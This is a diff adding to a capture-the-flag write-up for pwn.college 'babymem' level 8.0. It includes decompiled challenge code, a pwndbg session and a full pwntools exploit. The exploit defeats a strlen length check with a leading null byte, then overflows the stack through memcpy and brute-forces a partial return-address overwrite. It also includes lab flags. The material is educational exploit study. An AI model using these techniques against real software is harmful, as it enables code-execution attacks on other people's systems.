@@ -2422,7 +2422,7 @@ def send_payload(target, payload):
 
         return b"You win!" in response
     except Exception as e:
-        log.failure(f"An error occurred: {e}")
+        log.exception(f"An error occurred: {e}")
 
         return False
 
@@ -2441,7 +2441,7 @@ while True:
             pause()
             exit()
     except Exception as e:
-        log.error(f"An error occurred in main loop: {e}")
+        log.exception(f"An error occurred in main loop: {e}")
 ```
 
 #### Flag
@@ -2512,9 +2512,7 @@ def send_payload(target, payload):
 
         return b"You win!" in response
     except Exception as e:
-        log.failure(f"An error occurred: {e}")
-
-        return False
+        log.exception(f"An error occurred: {e}")
 
 
 while True:
@@ -2531,9 +2529,332 @@ while True:
             pause()
             exit()
     except Exception as e:
-        log.error(f"An error occurred in main loop: {e}")
+        log.exception(f"An error occurred in main loop: {e}")
 ```
 
 #### Flag
 
 Flag: `pwn.college{EC4bj1hO9Oo1kCMvjnoAdmOg2ed.0lMwMDL5cTNxgzW}`
+
+### Level 8.0
+
+#### Information
+
+- Category: Pwn
+
+#### Description
+
+> Overflow a buffer and smash the stack to obtain the flag, but this time in a position independent (PIE) binary with an additional check on your input.
+
+#### Write-up
+
+```c {8, 24} ins={118-120} del={112, 116, 125} collapse={1-4, 12-20, 28-108, 129-156}
+__int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
+{
+  int *v3; // rax
+  char *v4; // rax
+  _QWORD v6[3]; // [rsp+0h] [rbp-80h] BYREF
+  int v7; // [rsp+1Ch] [rbp-64h]
+  size_t size; // [rsp+28h] [rbp-58h] BYREF
+  _QWORD v9[4]; // [rsp+30h] [rbp-50h] BYREF
+  int v10; // [rsp+50h] [rbp-30h]
+  char v11; // [rsp+54h] [rbp-2Ch]
+  size_t v12; // [rsp+60h] [rbp-20h]
+  int v13; // [rsp+6Ch] [rbp-14h]
+  void *buf; // [rsp+70h] [rbp-10h]
+  void *dest; // [rsp+78h] [rbp-8h]
+  __int64 savedregs; // [rsp+80h] [rbp+0h] BYREF
+  _UNKNOWN *retaddr; // [rsp+88h] [rbp+8h] BYREF
+
+  v7 = a1;
+  v6[2] = a2;
+  v6[1] = a3;
+  memset(v9, 0, sizeof(v9));
+  v10 = 0;
+  v11 = 0;
+  dest = v9;
+  size = 0LL;
+  puts("The challenge() function has just been launched!");
+  sp_ = (__int64)v6;
+  bp_ = (__int64)&savedregs;
+  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)v6) >> 3) + 2;
+  rp_ = (__int64)&retaddr;
+  puts("Before we do anything, let's take a look at challenge()'s stack frame:");
+  DUMP_STACK(sp_, sz_);
+  printf("Our stack pointer points to %p, and our base pointer points to %p.\n", (const void *)sp_, (const void *)bp_);
+  printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
+  puts("including the saved base pointer and the saved return address, for a");
+  printf("total of %d bytes.\n", 8 * sz_);
+  printf("The input buffer begins at %p, partway through the stack frame,\n", dest);
+  puts("(\"above\" it in the stack are other local variables used by the function).");
+  puts("Your input will be read into this buffer.");
+  printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 37);
+  puts("large input length, and thus overflow the buffer.\n");
+  puts("In this level, there is no \"win\" variable.");
+  puts("You will need to force the program to execute the win_authed() function");
+  puts("by directly overflowing into the stored return address back to main,");
+  printf(
+    "which is stored at %p, %d bytes after the start of your input buffer.\n",
+    (const void *)rp_,
+    rp_ - (_DWORD)dest);
+  printf(
+    "That means that you will need to input at least %d bytes (%d to fill the buffer,\n",
+    rp_ - (_DWORD)dest + 8,
+    37);
+  printf("%d to fill other stuff stored between the buffer and the return address,\n", rp_ - (_DWORD)dest - 37);
+  puts("and 8 that will overwrite the return address).\n");
+  puts("We have disabled the following standard memory corruption mitigations for this challenge:");
+  puts("- the canary is disabled, otherwise you would corrupt it before");
+  puts("overwriting the return address, and the program would abort.");
+  puts("Because the binary is position independent, you cannot know");
+  puts("exactly where the win_authed() function is located.");
+  puts("This means that it is not clear what should be written into the return address.\n");
+  printf("Payload size: ");
+  __isoc99_scanf("%lu", &size);
+  printf("You have chosen to send %lu bytes of input!\n", size);
+  printf("This will allow you to write from %p (the start of the input buffer)\n", dest);
+  printf(
+    "right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n",
+    (char *)dest + size,
+    size - 37);
+  printf("Of these, you will overwrite %d bytes into the return address.\n", size + (_DWORD)dest - rp_);
+  puts("If that number is greater than 8, you will overwrite the entire return address.\n");
+  puts("Overwriting the entire return address is fine when we know");
+  puts("the whole address, but here, we only really know the last three nibbles.");
+  puts("These nibbles never change, because pages are aligned to 0x1000.");
+  puts("This gives us a workaround: we can overwrite the least significant byte");
+  puts("of the saved return address, which we can know from debugging the binary,");
+  puts("to retarget the return to main to any instruction that shares the other 7 bytes.");
+  puts("Since that last byte will be constant between executions (due to page alignment),");
+  puts("this will always work.");
+  puts("If the address we want to redirect execution to is a bit farther away from");
+  puts("the saved return address, and we need to write two bytes, then one of those");
+  puts("nibbles (the fourth least-significant one) will be a guess, and it will be");
+  puts("incorrect 15 of 16 times.");
+  puts("This is okay: we can just run our exploit a few times until it works");
+  puts("(statistically, ~50% chance after 11 times and ~90% chance after 36 times).");
+  puts("One caveat in this challenge is that the win_authed() function must first auth:");
+  puts("it only lets you win if you provide it with the argument 0x1337.");
+  puts("Speifically, the win_authed() function looks something like:");
+  puts("    void win_authed(int token)");
+  puts("    {");
+  puts("      if (token != 0x1337) return;");
+  puts("      puts(\"You win! Here is your flag: \");");
+  puts("      sendfile(1, open(\"/flag\", 0), 0, 256);");
+  puts("      puts(\"\");");
+  puts("    }");
+  puts(byte_3F3B);
+  puts("So how do you pass the check? There *is* a way, and we will cover it later,");
+  puts("but for now, we will simply bypass it! You can overwrite the return address");
+  puts("with *any* value (as long as it points to executable code), not just the start");
+  puts("of functions. Let's overwrite past the token check in win!\n");
+  puts("To do this, we will need to analyze the program with objdump, identify where");
+  puts("the check is in the win_authed() function, find the address right after the check,");
+  puts("and write that address over the saved return address.\n");
+  puts("Go ahead and find this address now. When you're ready, input a buffer overflow");
+  printf(
+    "that will overwrite the saved return address (at %p, %d bytes into the buffer)\n",
+    (const void *)rp_,
+    rp_ - (_DWORD)dest);
+  puts("with the correct value.\n");
+  puts("This challenge is careful about reading your input: it will allocate a correctly-sized temporary");
+  puts("buffer on the heap, and then copy the data over to the stack. Can you figure out a way to fool");
+  puts("this technique and cause an overflow?");
+  buf = malloc(size);
+  if ( !buf )
+    __assert_fail("tmp_input != 0", "/challenge/babymem-level-8-0.c", 0xC0u, "challenge");
+  printf("Send your payload (up to %lu bytes)!\n", size);
+  v13 = read(0, buf, size);
+  puts("Checking length of received string...");
+  v12 = strlen((const char *)buf);
+  if ( v12 > 0x24 )
+    __assert_fail("string_length < 37", "/challenge/babymem-level-8-0.c", 0xC5u, "challenge");
+  printf(
+    "Passed! We should have enough space for all %d bytes of it on the stack. Copying all %d received bytes!\n",
+    v12,
+    v13);
+  memcpy(dest, buf, v13);
+  if ( v13 < 0 )
+  {
+    v3 = __errno_location();
+    v4 = strerror(*v3);
+    printf("ERROR: Failed to read input -- %s!\n", v4);
+    exit(1);
+  }
+  printf("You sent %d bytes!\n", v13);
+  puts("Let's see what happened with the stack:\n");
+  DUMP_STACK(sp_, sz_);
+  puts("The program's memory status:");
+  printf("- the input buffer starts at %p\n", dest);
+  printf("- the saved frame pointer (of main) is at %p\n", (const void *)bp_);
+  printf("- the saved return address (previously to main) is at %p\n", (const void *)rp_);
+  printf("- the saved return address is now pointing to %p.\n", *(const void **)rp_);
+  printf("- the address of win_authed() is %p.\n", win_authed);
+  putchar(10);
+  puts("If you have managed to overwrite the return address with the correct value,");
+  puts("challenge() will jump straight to win_authed() when it returns.");
+  printf("Let's try it now!\n\n");
+  if ( (unsigned __int64)dest + v13 > rp_ + 2 )
+  {
+    puts("WARNING: You sent in too much data, and overwrote more than two bytes of the address.");
+    puts("         This can still work, because I told you the correct address to use for");
+    puts("         this execution, but you should not rely on that information.");
+    puts("         You can solve this challenge by only overwriting two bytes!");
+    puts("         ");
+  }
+  puts("Goodbye!");
+  return 0LL;
+}
+```
+
+我们知道 `memcpy` 会把我们输入的数据从 `buf` 复制到 `dest`，具体复制多少是根据 `v13`，也就是 `read` 到的大小决定的，那这就存在了缓冲出溢出问题了。所以思路是我们利用 `memcpy` 覆盖返回地址控制执行流。
+
+内存我们正常分配就好，这里主要是得设法绕过 `v12 > 0x24`，也就是 payload 不能大于 36 bytes，很显然这是不现实的，覆盖返回段地址至少要 0x58 bytes。
+
+注意到判断输入长度的函数是 `strlen`。这个函数根据 Null 字符 `\x00` 判断字符串是否结束。那么，如果我们在 payload 一开始就写一个 Null 字符，`strlen` 就会认为字符串长度为零，成功绕过判断。
+
+```asm wrap=false showLineNumbers=false {23} collapse={1-19, 27-52}
+Breakpoint 1, 0x000055555555622f in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
+ RAX  0x7fffffffd160 ◂— 0
+ RBX  0x7fffffffe308 —▸ 0x7fffffffe6ba ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-8-0'
+ RCX  0x55555555b2a0 ◂— 0xa /* '\n' */
+ RDX  1
+ RDI  0x7fffffffd160 ◂— 0
+ RSI  0x55555555b2a0 ◂— 0xa /* '\n' */
+ R8   0x64
+ R9   0xffffffff
+ R10  0
+ R11  0x202
+ R12  1
+ R13  0
+ R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
+ R15  0
+ RBP  0x7fffffffd1b0 —▸ 0x7fffffffe1e0 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2e0 ◂— 0
+ RSP  0x7fffffffd130 —▸ 0x7fffffffd160 ◂— 0
+ RIP  0x55555555622f (challenge+1522) ◂— call 0x5555555551d0
+────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
+ ► 0x55555555622f <challenge+1522>    call   memcpy@plt                  <memcpy@plt>
+        dest: 0x7fffffffd160 ◂— 0
+        src: 0x55555555b2a0 ◂— 0xa /* '\n' */
+        n: 1
+
+   0x555555556234 <challenge+1527>    cmp    dword ptr [rbp - 0x14], 0
+   0x555555556238 <challenge+1531>    jns    challenge+1577              <challenge+1577>
+
+   0x55555555623a <challenge+1533>    call   __errno_location@plt        <__errno_location@plt>
+
+   0x55555555623f <challenge+1538>    mov    eax, dword ptr [rax]
+   0x555555556241 <challenge+1540>    mov    edi, eax
+   0x555555556243 <challenge+1542>    call   strerror@plt                <strerror@plt>
+
+   0x555555556248 <challenge+1547>    mov    rsi, rax
+   0x55555555624b <challenge+1550>    lea    rdi, [rip + 0x21b6]     RDI => 0x555555558408 ◂— 'ERROR: Failed to read input -- %s!\n'
+   0x555555556252 <challenge+1557>    mov    eax, 0                  EAX => 0
+   0x555555556257 <challenge+1562>    call   printf@plt                  <printf@plt>
+─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp     0x7fffffffd130 —▸ 0x7fffffffd160 ◂— 0
+01:0008│-078     0x7fffffffd138 —▸ 0x7fffffffe318 —▸ 0x7fffffffe6f0 ◂— 'SHELL=/usr/bin/zsh'
+02:0010│-070     0x7fffffffd140 —▸ 0x7fffffffe308 —▸ 0x7fffffffe6ba ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-8-0'
+03:0018│-068     0x7fffffffd148 ◂— 0x1f7e3070b
+04:0020│-060     0x7fffffffd150 —▸ 0x555555558770 ◂— 0x2023232300232323 /* '###' */
+05:0028│-058     0x7fffffffd158 ◂— 0x6eb
+06:0030│ rax rdi 0x7fffffffd160 ◂— 0
+07:0038│-048     0x7fffffffd168 ◂— 0
+───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x55555555622f challenge+1522
+   1   0x55555555649b main+198
+   2   0x7ffff7dcae08
+   3   0x7ffff7dcaecc __libc_start_main+140
+   4   0x55555555526e _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> i frame
+Stack level 0, frame at 0x7fffffffd1c0:
+ rip = 0x55555555622f in challenge; saved rip = 0x55555555649b
+ called by frame at 0x7fffffffe1f0
+ Arglist at 0x7fffffffd1b0, args:
+ Locals at 0x7fffffffd1b0, Previous frame's sp is 0x7fffffffd1c0
+ Saved registers:
+  rbp at 0x7fffffffd1b0, rip at 0x7fffffffd1b8
+pwndbg> dist 0x7fffffffd160 0x7fffffffd1b8
+0x7fffffffd160->0x7fffffffd1b8 is 0x58 bytes (0xb words)
+pwndbg>
+```
+
+#### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import context, ELF, log, pause, process, random, remote, gdb
+
+context(os="linux", arch="amd64", log_level="debug", terminal="kitty")
+
+FILE = "./babymem-level-8-0"
+HOST = "pwn.college"
+PORT = 1337
+
+gdbscript = """
+b *challenge+1421
+b *challenge+1502
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+null = b"\x00"
+padding_size = b"".ljust(0x58 - 0x1, b"A")
+fixed_offset = b"\x3c"
+possible_bytes = [bytes([i]) for i in range(0x0B, 0x10B, 0x10)]
+
+
+def send_payload(target, payload):
+    try:
+        payload_size = f"{len(payload)}".encode()
+        target.recvuntil(b"Payload size: ")
+        target.sendline(payload_size)
+        target.recvuntil(b"Send your payload")
+        target.send(payload)
+
+        response = target.recvall()
+
+        return b"You win!" in response
+    except Exception as e:
+        log.exception(f"An error occurred: {e}")
+
+
+while True:
+    try:
+        target = launch(debug=False)
+
+        payload = null + padding_size
+        payload += fixed_offset + random.choice(possible_bytes)
+        log.info(f"Trying payload: {payload.hex()}")
+
+        if send_payload(target, payload):
+            log.success("Success! Exiting...")
+
+            pause()
+            exit()
+    except Exception as e:
+        log.exception(f"An error occurred in main loop: {e}")
+```
+
+#### Flag
+
+Flag: `pwn.college{82SpQ2oiZjETn254hnZR69O97tP.01MwMDL5cTNxgzW}`
